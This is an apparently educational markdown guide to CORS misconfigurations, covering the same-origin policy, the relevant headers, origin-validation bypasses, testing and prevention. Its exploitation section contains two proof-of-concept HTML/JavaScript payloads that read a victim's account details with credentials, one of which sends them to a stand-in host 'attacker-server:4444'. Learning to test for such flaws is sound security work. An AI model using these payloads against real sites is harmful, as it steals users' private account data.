# CORS
---

## Prerequisites

### Same-Origin Policy (SOP)
Rule that is enforced by browsers to control access to data between web applications
* This does not prevent **writing** between web applications, it prevents **reading** between web applications
* Access is determined based on the origin

### What Is An Origin?
Origin is defined by the scheme (protocol), hostname (domain), and port of the URL used to access it.

https(scheme)://securitynotesfordummies.com(host):443(port)

---

## What is Cross-Origin Resource Sharing (CORS)?
CORS is a mechanism that uses **HTTP headers** to define origins that the browser permit loading resources

* CORS makes use of 2 HTTP headers:
    * Access-Control-Allow-Origin
    * Access-Control-Allow-Credentials

### Access-Control-Allow-Origin Header
The Access-Control-Allow-Origin response header indicates whether the response can be shared with requesting code from the given origin

**Syntax**
```xml
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: <origin>
Access-Control-Allow-Origin: null
```

### Access-Control-Allow-Credentials Header
The Access-Control-Allow-Credentials response header allows cookies (or other user credentials) to be included in cross-origin requests

**Syntax**
```xml
Access-Control-Allow-Credentials: true
```

**NOTE:** If the server is configured with the wildcard ("*") as the value of Access-Control-Allow-Origin header, then the use of credentials is not allowed. 

### CORS Vulnerabilities
* CORS vulnerabilities arise from CORS configuration issues
* Arise from restrictions on available options to set the **Access-Control-Allow-Origin** header
```xml
Access-Control-Allow-Origin: *
Access-Control-Allow-Origin: <origin>
Access-Control-Allow-Origin: null
```
* Forces developers to use **dynamic generation**

CORS vulnerabilities arise from flaws in the way that dynamic generation is implemented: 
* Server-generated Access-Control-Allow-Origin header from client-specified Origin header
* Error parsing Origin headers
    * Granting access to all domains that end in a specific string
        * Example: bank.com
        * Bypass: maliciousbank.com
    * Granting access to all domains that begin with a specific string
        * Example: bank.com
        * Bypass: bank.com.malicious.com
* Whitelisted null origin value

### Impact of CORS Vulnerabilities
* Depends on the application that is being exploited
    * Confidentiality – it can be None / Partial (Low) / High
    * Integrity – usually either Partial or High
    * Availability – can be None / Partial (Low) / High
* Remote code execution on the server

---

## How To Find CORS Vulnerabilities?

### Black-Box Testing
* Map the application
* Test the application for dynamic generation
    * Does it reflect the user-suplied ACAO header?
    * Does it only validate on the start/end of a specific string?
    * Does it allow the null origin?
    * Does it restrict the protocol?
    * Does it allow credentials?
* Once you have determined that a CORS vulnerability exists, review the application's functionality to determine how you cna prove impact

### White-Box Testing
* Identify the framework/technologies that is being used by the application
* Find out how this specific technology allows for CORS configuration
* Review code to identify any misconfigurations in CORS rules

## How To Exploit CORS Vulnerabilities?
* If the application allows for credentials: 
    * Server generated user supplied origin
    * Validates on the start/end of a specific string

```javascript
<html>
<body>
<h1>Hello World!</h1>
<script>
var xhr = new XMLHttpRequest();
var url = "https://vulnerable-site.com"
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch("/log?key=" + xhr.responseText)
}
}
xhr.open('GET', url + "/accountDetails", true);
xhr.withCredentials = true;
xhr.send(null);
</script>
</body>
</html>
```

* If the application allows for credentials: 
    * Accepts the null origin

```javascript
<html>
<body>
<h1>Hello World!</h1>
<iframe style="display: none;" sandbox="allow-scripts" srcdoc="
<script>
var xhr = new XMLHttpRequest();
var url = 'https://vulnerable-site.com'
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
fetch('http://attacker-server:4444/log?key=' + xhr.responseText)
}
}
xhr.open('GET', url + '/accountDetails', true);
xhr.withCredentials = true;
xhr.send(null);
</script>"></iframe>
</body>
</html>
```

* If the application does not allow for credentials
    * What security impact does that have on the application?

---

## How To Prevent CORS Vulnerabilities?
* Proper configuration of cross-origin requests
* Only allow trusted sites
* Avoid whitelisting null
* Avoid wildcards in internal networks

---

## Resources
* [Web Security Academy - Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)
* [AppSec EU 2017 Exploiting CORS Misconfigurations For Bitcoins And Bounties by James Kettle](https://www.youtube.com/watch?v=wgkj4ZgxI4c&ab_channel=OWASPFoundation)
* [Exploiting CORS misconfigurations for Bitcoins and bounties](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)
* [JetBrains IDE Remote Code Execution and Local File Disclosure](http://blog.saynotolinux.com/blog/2016/08/15/jetbrains-ide-remote-code-execution-and-local-file-disclosure-vulnerability-analysis/)
* [Advanced CORS Exploitation Techniques](https://www.corben.io/advanced-cors-techniques/)